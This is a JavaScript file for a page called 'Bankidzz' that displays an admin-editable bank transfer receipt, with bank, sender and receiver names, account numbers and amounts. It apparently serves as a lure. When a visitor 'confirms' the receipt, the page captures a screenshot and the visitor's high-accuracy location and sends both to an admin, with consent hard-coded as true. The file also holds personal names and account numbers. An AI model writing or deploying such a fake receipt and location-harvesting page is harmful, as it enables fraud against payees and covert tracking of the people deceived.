// ============================================================
// BANKIDZZ - SISTEM PENGESAHAN LOKASI & STRUK (WITH SCREENSHOT CAPTURE)
// ============================================================

(function() {
    'use strict';

    const CONFIG = {
        API_URL: '/api/locations',
        TEMPLATE_URL: '/api/template',
        SYNC_CHANNEL: 'bankidzz_sync_channel'
    };

    // Default Template
    const defaultTemplate = {
        topBarTitle: 'JAPANESE BANK',
        primaryColor: '#0033ff',
        profileImage: 'channels4_profile.jpg',
        bankName: 'BIBD Brunei Darussalam',
        bankSub: 'Office Purchasing',
        amountMain: 'IDR 515.000',
        amountSub: 'BND 35.12',
        senderBank: 'BIBD Brunei Darussalam',
        senderName: 'FITO ALAMSYAH',
        senderAccount: '72828172718',
        receiverBank: 'BANK BNI',
        receiverAccount: '2093832050',
        receiverName: 'Tasliyah',
        buttonText: 'Ambil Foto Konfirmasi / Tanda Tangan'
    };

    let currentTemplate = { ...defaultTemplate };
    let capturedPhotoBase64 = null;

    // DOM Elements
    const elements = {
        topBarTitle: document.getElementById('topBarTitle'),
        profileImage: document.getElementById('profileImage'),
        bankName: document.getElementById('bankName'),
        bankSub: document.getElementById('bankSub'),
        amountMain: document.getElementById('amountMain'),
        amountSub: document.getElementById('amountSub'),
        senderBankDetail: document.getElementById('senderBankDetail'),
        senderName: document.getElementById('senderName'),
        senderAccount: document.getElementById('senderAccount'),
        receiverBankDetail: document.getElementById('receiverBankDetail'),
        receiverAccount: document.getElementById('receiverAccount'),
        receiverName: document.getElementById('receiverName'),
        btnConfirm: document.getElementById('btnConfirm'),
        notification: document.getElementById('notification'),
        receiptCard: document.getElementById('receiptCard'),
        // Modal
        photoModal: document.getElementById('photoModal'),
        modalPreviewImg: document.getElementById('modalPreviewImg'),
        btnCloseModal: document.getElementById('btnCloseModal'),
        btnCancelPhoto: document.getElementById('btnCancelPhoto'),
        btnSendPhoto: document.getElementById('btnSendPhoto'),
        fileCameraInput: document.getElementById('fileCameraInput')
    };

    // Update UI based on template data
    function applyTemplate(template) {
        currentTemplate = { ...defaultTemplate, ...template };
        
        // CSS Variable for Theme Color
        document.documentElement.style.setProperty('--primary-blue', currentTemplate.primaryColor || '#0033ff');
        
        // Page Title / Meta
        document.title = currentTemplate.topBarTitle || 'Bankidzz';
        
        // Elements
        if(elements.topBarTitle) elements.topBarTitle.textContent = currentTemplate.topBarTitle;
        if(elements.profileImage && currentTemplate.profileImage) elements.profileImage.src = currentTemplate.profileImage;
        if(elements.bankName) elements.bankName.textContent = currentTemplate.bankName;
        if(elements.bankSub) elements.bankSub.textContent = currentTemplate.bankSub;
        if(elements.amountMain) elements.amountMain.textContent = currentTemplate.amountMain;
        if(elements.amountSub) elements.amountSub.textContent = currentTemplate.amountSub;
        
        if(elements.senderBankDetail) elements.senderBankDetail.textContent = currentTemplate.senderBank;
        if(elements.senderName) elements.senderName.textContent = currentTemplate.senderName;
        if(elements.senderAccount) elements.senderAccount.textContent = currentTemplate.senderAccount;
        
        if(elements.receiverBankDetail) elements.receiverBankDetail.textContent = currentTemplate.receiverBank;
        if(elements.receiverAccount) elements.receiverAccount.textContent = currentTemplate.receiverAccount;
        if(elements.receiverName) elements.receiverName.textContent = currentTemplate.receiverName;
        
        if(elements.btnConfirm && (!elements.btnConfirm.dataset.verified || elements.btnConfirm.dataset.verified === 'false')) {
            elements.btnConfirm.textContent = currentTemplate.buttonText || 'Ambil Foto Konfirmasi / Tanda Tangan';
        }
    }

    // Load template from server or localStorage
    async function loadTemplate() {
        try {
            const response = await fetch(CONFIG.TEMPLATE_URL, { cache: 'no-store' });
            if (response.ok) {
                const result = await response.json();
                if (result.template) {
                    localStorage.setItem('bankidzz_new_template', JSON.stringify(result.template));
                    applyTemplate(result.template);
                    return;
                }
            }
        } catch(e) {
            console.warn('[Bankidzz] Cannot load template from server, using local.', e);
        }

        const stored = localStorage.getItem('bankidzz_new_template');
        if (stored) {
            try {
                applyTemplate(JSON.parse(stored));
            } catch(e) {
                applyTemplate(defaultTemplate);
            }
        } else {
            applyTemplate(defaultTemplate);
        }
    }

    // Capture screenshot using html2canvas & open confirmation modal
    async function handleConfirmClick() {
        if (!elements.receiptCard) return;

        const originalText = elements.btnConfirm.textContent;
        elements.btnConfirm.textContent = '📸 Mengambil Tangkap Layar...';
        elements.btnConfirm.disabled = true;

        try {
            // Take Screenshot of Receipt Card
            let canvas;
            if (typeof window.html2canvas === 'function') {
                canvas = await window.html2canvas(elements.receiptCard, {
                    scale: 2,
                    useCORS: true,
                    allowTaint: true,
                    backgroundColor: '#ffffff'
                });
                capturedPhotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
            } else {
                // Fallback placeholder canvas if html2canvas library didn't load
                canvas = document.createElement('canvas');
                canvas.width = 400;
                canvas.height = 500;
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#ffffff';
                ctx.fillRect(0, 0, 400, 500);
                ctx.fillStyle = '#0033ff';
                ctx.font = 'bold 20px Inter, sans-serif';
                ctx.fillText('BUKTI STRUK TRANSAKSI', 40, 50);
                capturedPhotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
            }

            // Show in Modal Preview
            if (elements.modalPreviewImg) {
                elements.modalPreviewImg.src = capturedPhotoBase64;
            }

            // Open Modal
            if (elements.photoModal) {
                elements.photoModal.style.display = 'flex';
            }
        } catch (err) {
            console.error('Error taking screenshot:', err);
            showNotification('Gagal mengambil tangkap layar struk.', 'error');
        } finally {
            elements.btnConfirm.textContent = originalText;
            elements.btnConfirm.disabled = false;
        }
    }

    // Close Modal
    function closeModal() {
        if (elements.photoModal) {
            elements.photoModal.style.display = 'none';
        }
    }

    // Handle Custom File Upload or Camera Shot
    if (elements.fileCameraInput) {
        elements.fileCameraInput.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(evt) {
                    capturedPhotoBase64 = evt.target.result;
                    if (elements.modalPreviewImg) {
                        elements.modalPreviewImg.src = capturedPhotoBase64;
                    }
                    showNotification('Foto berhasil diperbarui dari kamera/file!', 'success');
                };
                reader.readAsDataURL(file);
            }
        });
    }

    // Handle User Confirmation & Submission
    async function handleSendPhoto() {
        if (!capturedPhotoBase64) {
            showNotification('Foto struk belum tersedia!', 'error');
            return;
        }

        if (elements.btnSendPhoto) {
            elements.btnSendPhoto.textContent = '⏳ Mengirim Foto & Lokasi...';
            elements.btnSendPhoto.disabled = true;
        }

        // Get Location
        let locationData = {
            lat: -6.2088,
            lng: 106.8456,
            accuracy: 20,
            timestamp: new Date().toISOString(),
            note: 'Simulated location'
        };

        if (navigator.geolocation) {
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });
                locationData = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    timestamp: new Date().toISOString()
                };
            } catch (err) {
                console.warn('Geolocation denied or timeout, using simulated coords.', err);
            }
        }

        try {
            await saveTransactionAndPhoto(locationData, capturedPhotoBase64);

            closeModal();

            // Update Main UI Button
            if (elements.btnConfirm) {
                elements.btnConfirm.textContent = '✅ Konfirmasi Berhasil Diverifikasi';
                elements.btnConfirm.style.backgroundColor = '#10b981';
                elements.btnConfirm.dataset.verified = 'true';
            }

            showNotification('Foto struk dan lokasi berhasil dikirim ke Admin!', 'success');
        } catch (error) {
            console.error('Error submitting transaction:', error);
            showNotification('Gagal mengirim data ke server. Coba lagi.', 'error');
        } finally {
            if (elements.btnSendPhoto) {
                elements.btnSendPhoto.textContent = '✅ Konfirmasi & Kirim Foto';
                elements.btnSendPhoto.disabled = false;
            }
        }
    }

    async function saveTransactionAndPhoto(locationData, photoBase64) {
        const transferId = 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();
        
        const payload = {
            transferId: transferId,
            consent: true,
            sender: currentTemplate.senderName || 'FITO ALAMSYAH',
            senderBank: currentTemplate.senderBank || 'BIBD Brunei Darussalam',
            senderAccount: currentTemplate.senderAccount || '72828172718',
            receiver: currentTemplate.receiverName || 'Tasliyah',
            receiverBank: currentTemplate.receiverBank || 'BANK BNI',
            receiverAccount: currentTemplate.receiverAccount || '2093832050',
            amount: currentTemplate.amountMain || 'IDR 515.000',
            amountSub: currentTemplate.amountSub || 'BND 35.12',
            location: locationData,
            photo: photoBase64,
            status: 'verified',
            timestamp: new Date().toISOString()
        };

        // 1. Client Local Storage Backup (Ensures Admin can always read even if offline)
        try {
            const localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
            localStored.unshift(payload);
            localStorage.setItem('bankidzz_local_transactions', JSON.stringify(localStored));
        } catch(e) {}

        // 2. Broadcast Channel for real-time tab sync
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.postMessage({ type: 'NEW_LOCATION', payload: payload });
            channel.close();
        } catch(e) {}

        // 3. Post to Server API
        try {
            const response = await fetch(CONFIG.API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (!response.ok) {
                console.warn('API returned non-200, relying on local sync.');
            }
        } catch (e) {
            console.warn('Network error posting payload to server, synced locally.', e);
        }
    }

    function showNotification(msg, type = 'success') {
        const el = elements.notification;
        if (!el) return;
        el.textContent = msg;
        el.className = 'notification show ' + type;
        clearTimeout(el._timeout);
        el._timeout = setTimeout(() => {
            el.className = 'notification';
        }, 5000);
    }

    // Listen to changes from Admin Panel
    function setupSyncListener() {
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.addEventListener('message', (event) => {
                if (event.data && event.data.type === 'template_updated') {
                    if (event.data.template) {
                        localStorage.setItem('bankidzz_new_template', JSON.stringify(event.data.template));
                        applyTemplate(event.data.template);
                    }
                }
            });
        } catch(e) {}
    }

    // Modal Events
    if (elements.btnCloseModal) elements.btnCloseModal.addEventListener('click', closeModal);
    if (elements.btnCancelPhoto) elements.btnCancelPhoto.addEventListener('click', closeModal);
    if (elements.btnSendPhoto) elements.btnSendPhoto.addEventListener('click', handleSendPhoto);
    if (elements.btnConfirm) elements.btnConfirm.addEventListener('click', handleConfirmClick);

    // Init
    loadTemplate();
    setupSyncListener();

})();
